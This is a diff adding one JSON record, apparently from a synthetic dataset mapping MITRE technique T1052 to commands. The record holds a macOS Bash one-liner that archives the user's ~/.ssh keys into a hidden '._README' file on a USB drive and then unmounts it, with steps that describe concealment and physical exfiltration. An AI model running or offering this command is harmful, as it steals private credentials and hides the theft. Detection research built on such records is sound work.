@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar -czf - \"$HOME/.ssh\" 2>/dev/null | dd of=\"/Volumes/USB/._README\" bs=1m conv=sync,noerror && sync && diskutil unmount \"/Volumes/USB\"",
+  "explanation": "Streams compressed SSH keys and configs into an AppleDouble-style sidecar file on the removable drive using dd, then unmounts the volume for physical exfiltration.",
+  "rationale_steps": [
+    "Package SSH credentials and configs into a single archive stream.",
+    "Target an AppleDouble filename to reduce casual visibility.",
+    "Write directly to the USB with dd to ensure local-only transfer.",
+    "Sync and unmount to complete the physical exfiltration process."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-a619e1e8",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
